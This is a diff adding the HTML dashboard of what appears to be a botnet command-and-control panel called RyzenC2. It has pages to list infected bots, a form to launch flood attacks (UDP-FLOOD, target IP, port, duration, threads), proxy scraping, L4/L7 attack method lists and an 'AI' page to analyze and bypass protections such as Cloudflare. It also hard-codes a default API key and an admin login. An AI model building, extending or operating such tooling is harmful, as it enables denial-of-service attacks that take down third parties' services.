@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0a0e17">
+<link rel="manifest" href="manifest.webmanifest">
+<link rel="icon" href="static/img/logo.svg">
+<title>RyzenC2 PROMAX v8.0</title>
+<link rel="stylesheet" href="static/css/style.css">
+<link rel="stylesheet" href="static/css/theme-dark.css">
+<link rel="stylesheet" href="static/css/responsive.css">
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+</head>
+<body>
+<div id="app">
+  <aside class="sidebar">
+    <div class="brand">
+      <span class="logo">⚡</span>
+      <div>
+        <div class="brand-name">RyzenC2</div>
+        <div class="brand-ver">PROMAX v8.0</div>
+      </div>
+    </div>
+    <nav>
+      <a class="nav-item active" data-page="dashboard" href="#">📊 Dashboard</a>
+      <a class="nav-item" data-page="bots" href="#">🤖 Bots</a>
+      <a class="nav-item" data-page="attacks" href="#">🎯 Attacks</a>
+      <a class="nav-item" data-page="proxies" href="#">🌐 Proxies</a>
+      <a class="nav-item" data-page="methods" href="#">📋 Methods</a>
+      <a class="nav-item" data-page="ai" href="#">🧠 AI</a>
+      <a class="nav-item" data-page="logs" href="#">📜 Logs</a>
+      <a class="nav-item" data-page="terminal" href="#">💻 Terminal</a>
+      <a class="nav-item" data-page="settings" href="#">⚙️ Settings</a>
+    </nav>
+    <div class="sidebar-foot">
+      <span class="dot" id="connDot"></span> API <span id="apiStatus">…</span>
+      <kbd class="kbd">Ctrl+K</kbd>
+    </div>
+  </aside>
+  <main class="main">
+    <header class="topbar">
+      <h1 id="pageTitle">Dashboard</h1>
+      <div class="topbar-right">
+        <input id="apiKey" class="api-key" placeholder="X-API-Key" value="ryzenc2_api_key_change_me">
+        <button class="btn" id="btnRefresh">Refresh</button>
+        <button class="btn ghost" id="btnTheme" title="Theme">🌓</button>
+      </div>
+    </header>
+
+    <section id="page-dashboard" class="page active">
+      <div class="cards">
+        <div class="card c-cyan"><div class="card-label">Bots Online</div><div class="card-value" id="statBots">—</div></div>
+        <div class="card c-green"><div class="card-label">Proxies Alive</div><div class="card-value" id="statProxies">—</div></div>
+        <div class="card c-red"><div class="card-label">Attacks Running</div><div class="card-value" id="statAttacks">—</div></div>
+        <div class="card c-purple"><div class="card-label">Methods</div><div class="card-value" id="statMethods">—</div></div>
+      </div>
+      <div class="grid-2">
+        <div class="panel">
+          <h2>Activity</h2>
+          <canvas id="chartActivity" height="140"></canvas>
+        </div>
+        <div class="panel">
+          <h2>System</h2>
+          <pre id="healthBox" class="code">Loading…</pre>
+        </div>
+      </div>
+    </section>
+
+    <section id="page-bots" class="page">
+      <div class="toolbar">
+        <input class="search" id="botSearch" placeholder="Filter bots…">
+        <button class="btn" id="btnSimBots">Simulate +50</button>
+      </div>
+      <div class="panel table-wrap">
+        <table class="tbl" id="botsTable">
+          <thead><tr><th>UUID</th><th>OS</th><th>Arch</th><th>Status</th><th>Last seen</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="page-attacks" class="page">
+      <div class="panel form-panel">
+        <h2>Launch Attack</h2>
+        <div class="form-grid">
+          <label>Method <input id="atkMethod" value="UDP-FLOOD" list="methodList"></label>
+          <datalist id="methodList"></datalist>
+          <label>Target <input id="atkTarget" placeholder="1.2.3.4"></label>
+          <label>Port <input id="atkPort" type="number" value="80"></label>
+          <label>Duration <input id="atkDur" type="number" value="60"></label>
+          <label>Threads <input id="atkThr" type="number" value="100"></label>
+        </div>
+        <button class="btn danger" id="btnLaunch">Launch</button>
+      </div>
+      <div class="toolbar"><input class="search" id="atkSearch" placeholder="Filter attacks…"></div>
+      <div class="panel table-wrap">
+        <table class="tbl" id="atkTable">
+          <thead><tr><th>ID</th><th>Method</th><th>Target</th><th>Status</th><th>PPS</th><th></th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="page-proxies" class="page">
+      <div class="toolbar">
+        <input class="search" id="proxySearch" placeholder="Filter proxies…">
+        <button class="btn" id="btnScrape">Scrape</button>
+        <button class="btn" id="btnCheck">Check All</button>
+        <button class="btn" id="btnRmDead">Remove Dead</button>
+      </div>
+      <div class="panel table-wrap">
+        <table class="tbl" id="proxyTable">
+          <thead><tr><th>Address</th><th>Port</th><th>Type</th><th>Alive</th><th>Latency</th><th>Score</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="page-methods" class="page">
+      <div class="toolbar"><input class="search" id="methodSearch" placeholder="Filter methods…"></div>
+      <div class="grid-2">
+        <div class="panel"><h2>L4</h2><div id="l4List" class="tag-cloud"></div></div>
+        <div class="panel"><h2>L7</h2><div id="l7List" class="tag-cloud"></div></div>
+      </div>
+    </section>
+
+    <section id="page-ai" class="page">
+      <div class="panel form-panel">
+        <label>Target / vendor <input id="aiTarget" placeholder="example.com or cloudflare"></label>
+        <div class="toolbar">
+          <button class="btn" id="btnAnalyze">Analyze</button>
+          <button class="btn" id="btnPlan">Plan</button>
+          <button class="btn" id="btnBypass">Bypass</button>
+        </div>
+        <pre id="aiBox" class="code">—</pre>
+      </div>
+    </section>
+
+    <section id="page-logs" class="page">
+      <div class="panel"><pre id="logsBox" class="code">SSE /logs stream — hoặc xem logs/panel.log trên server</pre></div>
+    </section>
+
+    <section id="page-terminal" class="page">
+      <div class="panel">
+        <h2>Web Terminal</h2>
+        <pre id="termOut" class="code term-out" style="min-height:240px"></pre>
+        <div class="toolbar">
+          <input id="termIn" class="search" style="flex:1;min-width:200px" placeholder="help | stats | bots | proxies | clear" autocomplete="off">
+          <button class="btn" id="btnTerm">Run</button>
+        </div>
+      </div>
+    </section>
+
+    <section id="page-settings" class="page">
+      <div class="panel">
+        <p>UI + API: cùng origin khi mở <code>http://host:8080/</code></p>
+        <p>API Key header: <code>X-API-Key</code></p>
+        <p>CLI login: <code>admin / ryzenc2_secure_2026</code></p>
+        <p>SSE: <code>/sse/stats</code></p>
+        <p>GraphQL: <code>POST /api/v1/graphql</code></p>
+        <p>Phím tắt: <kbd>Ctrl+K</kbd> command palette · <kbd>R</kbd> refresh</p>
+        <div class="toolbar" style="margin-top:12px">
+          <button class="btn ghost" id="btnLangVi">Tiếng Việt</button>
+          <button class="btn ghost" id="btnLangEn">English</button>
+          <button class="btn ghost" id="btnInstallPWA">Install PWA</button>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<!-- Command palette B31 -->
+<div id="palette" class="palette hidden">
+  <input id="paletteInput" placeholder="Type a command…" autocomplete="off">
+  <ul id="paletteList"></ul>
+</div>
+<div id="toast" class="toast hidden"></div>
+
+<script src="static/js/i18n.js"></script>
+<script src="static/js/terminal.js"></script>
+<script src="static/js/main.js"></script>
+<script src="static/js/dashboard.js"></script>
+<script src="static/js/command_palette.js"></script>
+<script src="static/js/charts.js"></script>
+<script src="static/js/notifications.js"></script>
+<script>
+if ("serviceWorker" in navigator) {
+  navigator.serviceWorker.register("/sw.js").catch(function(){});
+}
+document.getElementById("btnLangVi")&&document.getElementById("btnLangVi").addEventListener("click",function(){I18N.set("vi");toast("VI");});
+document.getElementById("btnLangEn")&&document.getElementById("btnLangEn").addEventListener("click",function(){I18N.set("en");toast("EN");});
+document.getElementById("btnInstallPWA")&&document.getElementById("btnInstallPWA").addEventListener("click",function(){
+  if(window.__pwaPrompt){window.__pwaPrompt.prompt();}else{toast("Dùng menu Install của trình duyệt");}
+});
+window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();window.__pwaPrompt=e;});
+// terminal
+(function(){
+  var out=document.getElementById("termOut");
+  if(out&&window.RyzenTerm){RyzenTerm.mount(out);}
+  async function run(){
+    var inp=document.getElementById("termIn");
+    if(!inp||!window.RyzenTerm)return;
+    var apiBase="";
+    async function api(path){
+      var r=await fetch(apiBase+path,{headers:{"X-API-Key":(document.getElementById("apiKey")||{}).value||"ryzenc2_api_key_change_me"}});
+      return r.json();
+    }
+    await RyzenTerm.exec(inp.value, api);
+    inp.value="";
+  }
+  document.getElementById("btnTerm")&&document.getElementById("btnTerm").addEventListener("click",run);
+  document.getElementById("termIn")&&document.getElementById("termIn").addEventListener("keydown",function(e){if(e.key==="Enter")run();});
+})();
+if(window.I18N)I18N.set(I18N.lang);
+</script>
+</body>
+</html>
